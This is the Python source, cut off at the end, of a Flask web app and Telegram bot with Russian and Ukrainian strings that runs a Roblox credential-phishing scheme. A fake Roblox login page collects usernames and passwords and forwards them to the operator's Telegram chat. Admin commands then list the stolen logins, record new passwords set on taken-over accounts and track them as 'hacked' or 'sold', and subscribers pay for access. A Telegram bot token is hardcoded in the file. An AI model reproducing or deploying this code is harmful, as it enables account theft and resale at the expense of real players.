from flask import Flask, request, render_template, redirect, url_for
import telebot
from telebot import types
import psycopg2
import os
from datetime import datetime, timedelta
import requests

# === Настройки ===
TOKEN = '8028944732:AAH992DI-fMd3OSjfqfs4pEa3J04Jwb48Q4'
ADMIN_CHAT_ID = '6956377285'
DATABASE_URL = os.getenv('DATABASE_URL')
SITE_URL = os.getenv('SITE_URL', 'https://your-app-name.onrender.com')  # Оновіть після деплою

app = Flask(__name__)
bot = telebot.TeleBot(TOKEN)

# === Ініціалізація бази даних ===
def get_db_connection():
    return psycopg2.connect(DATABASE_URL)

def init_db():
    conn = get_db_connection()
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users 
                 (chat_id TEXT PRIMARY KEY, prefix TEXT, subscription_end TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS credentials 
                 (login TEXT PRIMARY KEY, password TEXT, added_time TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS hacked_accounts 
                 (login TEXT PRIMARY KEY, password TEXT, hack_date TEXT, 
                  prefix TEXT, sold_status TEXT, linked_chat_id TEXT)''')
    # Додаємо Создателя
    subscription_end = (datetime.now() + timedelta(days=3650)).isoformat()
    c.execute("INSERT INTO users (chat_id, prefix, subscription_end) VALUES (%s, %s, %s) "
              "ON CONFLICT (chat_id) DO UPDATE SET prefix = %s, subscription_end = %s",
              (ADMIN_CHAT_ID, "Создатель", subscription_end, "Создатель", subscription_end))
    conn.commit()
    conn.close()

# === Keep-alive (опціонально, якщо Render не спить) ===
def keep_alive():
    while True:
        try:
            requests.get(SITE_URL)
            print("🔁 Keep-alive ping sent")
        except Exception as e:
            print(f"Keep-alive failed: {e}")
        time.sleep(300)

# === Робота з базою даних ===
def get_user(chat_id):
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("SELECT prefix, subscription_end FROM users WHERE chat_id = %s", (chat_id,))
    result = c.fetchone()
    conn.close()
    return {'prefix': result[0], 'subscription_end': datetime.fromisoformat(result[1])} if result else None

def save_user(chat_id, prefix, subscription_end):
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("INSERT INTO users (chat_id, prefix, subscription_end) VALUES (%s, %s, %s) "
              "ON CONFLICT (chat_id) DO UPDATE SET prefix = %s, subscription_end = %s",
              (chat_id, prefix, subscription_end.isoformat(), prefix, subscription_end.isoformat()))
    conn.commit()
    conn.close()

def delete_user(chat_id):
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("DELETE FROM users WHERE chat_id = %s", (chat_id,))
    conn.commit()
    conn.close()

def save_credential(login, password):
    added_time = datetime.now().isoformat()
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("INSERT INTO credentials (login, password, added_time) VALUES (%s, %s, %s) "
              "ON CONFLICT (login) DO UPDATE SET password = %s, added_time = %s",
              (login, password, added_time, password, added_time))
    conn.commit()
    conn.close()
    bot.send_message(ADMIN_CHAT_ID, f"🔐 Новый логин:\nЛогин: {login}\nПароль: {password}")

def get_all_credentials():
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("SELECT login, password, added_time FROM credentials")
    result = c.fetchall()
    conn.close()
    current_time = datetime.now()
    valid_credentials = []
    for login, password, added_time in result:
        if added_time:
            added_dt = datetime.fromisoformat(added_time)
            if (current_time - added_dt).days <= 7:
                valid_credentials.append((login, password, added_time))
            else:
                delete_credential(login)
    return valid_credentials

def delete_credential(login):
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("DELETE FROM credentials WHERE login = %s", (login,))
    rows_affected = c.rowcount
    conn.commit()
    conn.close()
    return rows_affected > 0

def save_hacked_account(login, password, prefix="Взломан", sold_status="Не продан", linked_chat_id=None):
    hack_date = datetime.now().isoformat()
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("INSERT INTO hacked_accounts (login, password, hack_date, prefix, sold_status, linked_chat_id) "
              "VALUES (%s, %s, %s, %s, %s, %s) "
              "ON CONFLICT (login) DO UPDATE SET password = %s, hack_date = %s, prefix = %s, sold_status = %s, linked_chat_id = %s",
              (login, password, hack_date, prefix, sold_status, linked_chat_id,
               password, hack_date, prefix, sold_status, linked_chat_id))
    conn.commit()
    conn.close()

def get_all_hacked_accounts():
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("SELECT login, password, hack_date, prefix, sold_status, linked_chat_id FROM hacked_accounts")
    result = c.fetchall()
    conn.close()
    return [{'login': r[0], 'password': r[1], 'hack_date': datetime.fromisoformat(r[2]), 
             'prefix': r[3], 'sold_status': r[4], 'linked_chat_id': r[5]} for r in result]

def delete_hacked_account(login):
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("DELETE FROM hacked_accounts WHERE login = %s", (login,))
    conn.commit()
    conn.close()
    return True

def clear_old_credentials():
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("SELECT login, added_time FROM credentials")
    result = c.fetchall()
    current_time = datetime.now()
    deleted = 0
    for login, added_time in result:
        if added_time:
            added_dt = datetime.fromisoformat(added_time)
            if (current_time - added_dt).days > 7:
                delete_credential(login)
                deleted += 1
    conn.close()
    return deleted

def get_all_users():
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("SELECT chat_id, prefix, subscription_end FROM users")
    result = c.fetchall()
    conn.close()
    return [{'chat_id': r[0], 'prefix': r[1], 'subscription_end': datetime.fromisoformat(r[2])} for r in result]

# === Перевірка прав ===
def is_admin(chat_id):
    user = get_user(str(chat_id))
    return user and user['prefix'] in ['Админ', 'Создатель']

def is_creator(chat_id):
    user = get_user(str(chat_id))
    return user and user['prefix'] == 'Создатель'

# === Flask маршрути ===
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login-roblox.html')
def login_page():
    return render_template('login-roblox.html')

@app.route('/submit', methods=['POST'])
def submit():
    login = request.form.get('login')
    password = request.form.get('password')
    if login and password:
        save_credential(login, password)
    return redirect(url_for('not_found'))

@app.route('/404')
def not_found():
    return render_template('404.html')

@app.route('/webhook', methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return 'OK', 200
    return 'Invalid request', 400

@app.route('/setup', methods=['GET'])
def setup():
    bot.remove_webhook()
    webhook_url = f"https://{os.getenv('RENDER_EXTERNAL_HOSTNAME')}/webhook"
    bot.set_webhook(url=webhook_url)
    init_db()
    return "Webhook and DB set", 200

# === Команди бота ===
@bot.message_handler(commands=['start'])
def start_cmd(message):
    chat_id = str(message.chat.id)
    if not get_user(chat_id):
        save_user(chat_id, 'Посетитель', datetime.now())
    bot.reply_to(message, "✅ Бот активен. Используйте /menu для информации.")

@bot.message_handler(commands=['menu'])
def menu_cmd(message):
    user = get_user(str(message.chat.id))
    if not user:
        bot.reply_to(message, "Вы не зарегистрированы!")
        return
    time_left = user['subscription_end'] - datetime.now()
    time_str = f"{time_left.days} дней" if time_left.total_seconds() > 0 else "Подписка истекла"
    bot.reply_to(message, f"🧾 Ваш статус:\nПрефикс: {user['prefix']}\nПодписка: {time_str}")

@bot.message_handler(commands=['site'])
def site_cmd(message):
    user = get_user(str(message.chat.id))
    if not user or user['prefix'] == 'Посетитель':
        bot.reply_to(message, "🔒 Доступно только для подписчиков!")
        return
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("Перейти на сайт", url=SITE_URL))
    bot.reply_to(message, "🌐 Нажмите кнопку ниже:", reply_markup=markup)

@bot.message_handler(commands=['hacked'])
def hacked_cmd(message):
    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
    if not args:
        accounts = get_all_hacked_accounts()
        if not accounts:
            bot.reply_to(message, "📭 Список взломанных аккаунтов пуст!")
            return
        response = "📋 Список взломанных аккаунтов:\n\n"
        for acc in accounts:
            response += (f"Логин: {acc['login']}\nПароль: {acc['password']}\n"
                        f"Дата взлома: {acc['hack_date'].strftime('%Y-%m-%d %H:%M')}\n"
                        f"Префикс: {acc['prefix']}\nСтатус: {acc['sold_status']}\n"
                        f"Привязка: {acc['linked_chat_id'] or 'Нет'}\n\n")
        if len(response) > 4096:
            parts = [response[i:i+4096] for i in range(0, len(response), 4096)]
            for part in parts:
                bot.reply_to(message, part)
        else:
            bot.reply_to(message, response)
        return
    if args[0] == "add" and len(args) >= 3:
        login, password = args[1], args[2]
        prefix = args[3] if len(args) > 3 else "Взломан"
        sold_status = args[4] if len(args) > 4 else "Не продан"
        linked_chat_id = args[5] if len(args) > 5 else None
        save_hacked_account(login, password, prefix, sold_status, linked_chat_id)
        bot.reply_to(message, f"✅ Аккаунт {login} добавлен в список взломанных!")
    elif args[0] == "delete" and len(args) == 2:
        login = args[1]
        if delete_hacked_account(login):
            bot.reply_to(message, f"✅ Аккаунт {login} удален из списка взломанных!")
        else:
            bot.reply_to(message, "❌ Ошибка при удалении аккаунта!")

@bot.message_handler(commands=['getchatid'])
def getchatid_cmd(message):
    chat_id = str(message.chat.id)
    bot.reply_to(message, f"Ваш Chat ID: {chat_id}")

@bot.message_handler(commands=['passwords'])
def passwords_cmd(message):
    if not is_admin(message.chat.id):
        bot.reply_to(message, "🔒 Команда доступна только администраторам!")
        return
    credentials = get_all_credentials()
    if not credentials:
        bot.reply_to(message, "📭 Список паролей пуст!")
        return
    for login, password, added_time in credentials:
        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton("Добавить в взломанные", callback_data=f"hack_{login}"),
            types.InlineKeyboardButton("Удалить", callback_data=f"delete_{login}")
        )
        response = (f"Логин: {login}\nПароль: {password}\n"
                    f"Добавлено: {datetime.fromisoformat(added_time).strftime('%Y-%m-%d %H:%M')}")
        bot.send_message(message.chat.id, response, reply_markup=markup)

@bot.message_handler(commands=['opendb'])
def opendb_cmd(message):
    if not is_creator(message.chat.id):
        bot.reply_to(message, "🔒 Команда доступна только Создателю!")
        return
    response = "🗄️ Просмотр базы данных:\n\n"
    response += "👥 Пользователи:\n"
    users = get_all_users()
    if not users:
        response += "Пусто\n"
    for user in users:
        time_left = user['subscription_end'] - datetime.now()
        time_str = f"{time_left.days} дней" if time_left.total_seconds() > 0 else "Истекла"
        response += f"Chat ID: {user['chat_id']}, Префикс: {user['prefix']}, Подписка: {time_str}\n"
    response += "\n🔑 Пароли:\n"
    credentials = get_all_credentials()
    if not credentials:
        response += "Пусто\n"
    for login, password, added_time in credentials:
        response += f"Логин: {login}, Пароль: {password}, Добавлено: {datetime.fromisoformat(added_time).strftime('%Y-%m-%d %H:%M')}\n"
    response += "\n🔓 Взломанные аккаунты:\n"
    hacked_accounts = get_all_hacked_accounts()
    if not hacked_accounts:
        response += "Пусто\n"
    for acc in hacked_accounts:
        response += (f"Логин: {acc['login']}, Пароль: {acc['password']}, "
                    f"Дата: {acc['hack_date'].strftime('%Y-%m-%d %H:%M')}, "
                    f"Префикс: {acc['prefix']}, Статус: {acc['sold_status']}, "
                    f"Привязка: {acc['linked_chat_id'] or 'Нет'}\n")
    if len(response) > 4096:
        parts = [response[i:i+4096] for i in range(0, len(response), 4096)]
        for part in parts:
            bot.reply_to(message, part)
    else:
        bot.reply_to(message, response)

@bot.message_handler(commands=['database'])
def database_cmd(message):
    if not is_creator(message.chat.id):
        bot.reply_to(message, "🔒 Команда доступна только Создателю!")
        return
    response = "🗄️ База данных:\n\n"
    response += "👥 Пользователи:\n"
    users = get_all_users()
    if not users:
        response += "Пусто\n"
    for user in users:
        time_left = user['subscription_end'] - datetime.now()
        time_str = f"{time_left.days} дней" if time_left.total_seconds() > 0 else "Истекла"
        response += f"Chat ID: {user['chat_id']}, Префикс: {user['prefix']}, Подписка: {time_str}\n"
    response += "\n🔑 Пароли:\n"
    credentials = get_all_credentials()
    if not credentials:
        response += "Пусто\n"
    for login, password, added_time in credentials:
        response += f"Логин: {login}, Пароль: {password}, Добавлено: {datetime.fromisoformat(added_time).strftime('%Y-%m-%d %H:%M')}\n"
    response += "\n🔓 Взломанные аккаунты:\n"
    hacked_accounts = get_all_hacked_accounts()
    if not hacked_accounts:
        response += "Пусто\n"
    for acc in hacked_accounts:
        response += (f"Логин: {acc['login']}, Пароль: {acc['password']}, "
                    f"Дата: {acc['hack_date'].strftime('%Y-%m-%d %H:%M')}, "
                    f"Префикс: {acc['prefix']}, Статус: {acc['sold_status']}, "
                    f"Привязка: {acc['linked_chat_id'] or 'Нет'}\n")
    response += "\n📝 Управление:\n"
    response += "/database add_user <chat_id> <prefix> <days>\n"
    response += "/database add_cred <login> <password>\n"
    response += "/database add_hacked <login> <password> <prefix> <sold_status> <linked_chat_id>\n"
    response += "/database delete_user <chat_id>\n"
    response += "/database delete_cred <login>\n"
    response += "/database delete_hacked <login>\n"
    if len(response) > 4096:
        parts = [response[i:i+4096] for i in range(0, len(response), 4096)]
        for part in parts:
            bot.reply_to(message, part)
    else:
        bot.reply_to(message, response)
    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
    if args:
        if args[0] == "add_user" and len(args) == 4:
            chat_id, prefix, days = args[1], args[2], int(args[3])
            subscription_end = datetime.now() + timedelta(days=days)
            save_user(chat_id, prefix, subscription_end)
            bot.send_message(message.chat.id, f"✅ Добавлен пользователь {chat_id}")
        elif args[0] == "add_cred" and len(args) == 3:
            login, password = args[1], args[2]
            save_credential(login, password)
            bot.send_message(message.chat.id, f"✅ Добавлен пароль для {login}")
        elif args[0] == "add_hacked" and len(args) >= 3:
            login, password = args[1], args[2]
            prefix = args[3] if len(args) > 3 else "Взломан"
            sold_status = args[4] if len(args) > 4 else "Не продан"
            linked_chat_id = args[5] if len(args) > 5 else None
            save_hacked_account(login, password, prefix, sold_status, linked_chat_id)
            bot.send_message(message.chat.id, f"✅ Добавлен взломанный аккаунт {login}")
        elif args[0] == "delete_user" and len(args) == 2:
            chat_id = args[1]
            delete_user(chat_id)
            bot.send_message(message.chat.id, f"✅ Удален пользователь {chat_id}")
        elif args[0] == "delete_cred" and len(args) == 2:
            login = args[1]
            delete_credential(login)
            bot.send_message(message.chat.id, f"✅ Удален пароль для {login}")
        elif args[0] == "delete_hacked" and len(args) == 2:
            login = args[1]
            delete_hacked_account(login)
            bot.send_message(message.chat.id, f"✅ Удален взломанный аккаунт {login}")

@bot.callback_query_handler(func=lambda call: call.data.startswith("hack_") or call.data.startswith("delete_"))
def handle_callback(call):
    if not is_admin(call.message.chat.id):
        bot.answer_callback_query(call.id, "🔒 Доступно только администраторам!")
        return
    if call.data.startswith("hack_"):
        login = call.data.split("_")[1]
        credentials = get_all_credentials()
        for cred_login, old_password, _ in credentials:
            if cred_login == login:
                msg = bot.send_message(call.message.chat.id, 
                                      f"Логин: {login}\nСтарый пароль: {old_password}\nВведите новый пароль:")
                bot.register_next_step_handler(msg, lambda m: process_new_password(m, login, old_password, call.message.message_id))
                break
        bot.answer_callback_query(call.id, "Введите новый пароль")
    elif call.data.startswith("delete_"):
        login = call.data.split("_")[1]
        if delete_credential(login):
            bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                 text=f"Логин: {login}\n🗑️ Удалено!", reply_markup=None)
            bot.send_message(ADMIN_CHAT_ID, f"🗑️ {login} удалено из паролей!")
        bot.answer_callback_query(call.id, "Успешно удалено!")

def process_new_password(message, login, old_password, original_message_id):
    new_password = message.text
    if not new_password:
        bot.send_message(message.chat.id, "❌ Пароль не может быть пустым!")
        return
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton("Взломан", callback_data=f"status_{login}_{new_password}_Взломан"),
        types.InlineKeyboardButton("Продан", callback_data=f"status_{login}_{new_password}_Продан")
    )
    markup.add(types.InlineKeyboardButton("Привязать к аккаунту", callback_data=f"link_{login}_{new_password}"))
    bot.edit_message_text(chat_id=message.chat.id, message_id=original_message_id,
                         text=f"Логин: {login}\nНовый пароль: {new_password}\nВыберите статус:", reply_markup=markup)
    bot.delete_message(message.chat.id, message.message_id)

@bot.callback_query_handler(func=lambda call: call.data.startswith("status_"))
def handle_status(call):
    if not is_admin(call.message.chat.id):
        bot.answer_callback_query(call.id, "🔒 Доступно только администраторам!")
        return
    _, login, new_password, status = call.data.split("_")
    if delete_credential(login):
        save_hacked_account(login, new_password, prefix=status, sold_status=status)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                             text=f"Логин: {login}\nПароль: {new_password}\n✅ Добавлено со статусом '{status}'!", reply_markup=None)
        bot.send_message(ADMIN_CHAT_ID, f"🔒 {login} добавлено в взломанные со статусом '{status}'!")
        bot.answer_callback_query(call.id, "Успешно добавлено!")

@bot.callback_qu
